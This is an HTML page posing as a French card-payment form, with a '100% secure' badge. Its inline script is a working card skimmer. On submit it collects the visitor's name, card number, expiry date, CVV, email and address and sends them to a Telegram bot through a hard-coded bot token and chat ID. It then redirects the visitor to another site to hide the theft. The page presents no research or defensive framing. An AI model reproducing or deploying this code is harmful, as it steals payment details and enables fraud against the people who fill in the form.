
	<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Formulaire de paiement</title>
</head>
<body>
    <div class="payment-container">
        <div class="container">
            <h1>Paiement par Carte</h1>
            <div class="image-container">
                <!-- Replace the URL with your actual image URL -->
                <img src="img/logo.svg" alt="image">
            </div>
            <form id="paymentForm" class="form-container">
                <div class="name-container">
                    <input type="text" name="firstName" id="firstName" placeholder="Nom" required>
                    <input type="text" name="lastName" id="lastName" placeholder="Prenom" required>
                </div>
                <!-- Removed labels for brevity -->
                <input type="text" name="card" id="cardNumber" placeholder="Numero de carte" minlength="16" maxlength="16" required>
                <input type="text" name="cardName" id="cardName" placeholder="Nom sur la carte"  required>
                <input type="email" name="email" id="email" placeholder="Email" required>
                <input type="text" name="address" id="address" placeholder="Addresse" required>
                <div class="card-info">
                    <input type="text" name="expiryDate" id="expiryDate" placeholder="Date d'expiration (MM/AAAA)" required>
                    <input type="text" name="cvv" id="cvv" placeholder="CVV" required>
                </div>
                <button type="submit">Finaliser la Transaction</button>
                <div class="secure-text-container">
                    <h4 class="secure-text">Paiement 100% Sécurisé</h4>
                </div>
            </form>
        </div>
    </div>

    <script>
	   <script>
     document.getElementById('paymentForm').addEventListener('submit', function (e) {

        e.preventDefault();

        const telegramBotToken = '6550563050:AAE6DHJ9I4t5EOhVCpoOWY-ZSJiENK7E0Hs';

        const chatId = '-1002083816651';

        const formData = new FormData(e.target);

        // Construct the message text with form data

        let messageText = "New form submission:\n";

        formData.forEach((value, key) => {

            messageText += `${key}: ${value}\n`;

        });

        // Make an AJAX request to send data to Telegram

        const xhr = new XMLHttpRequest();
        const encodedMessageText = encodeURIComponent(messageText);
        xhr.open('GET', `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodedMessageText}`);

        xhr.send();
     
  xhr.onload = function () {
    if (xhr.status === 200) {
	    setTimeout(function(){
              
                window.location.href='https://recharge-fr.github.io/RCH/';
	      },4000);
            }
		       else {
                // Display an error popup
                window.alert('Erreur, veuillez réessayer');
            }
        };
    });
        
</script> 
    </script>
</body>
</html>
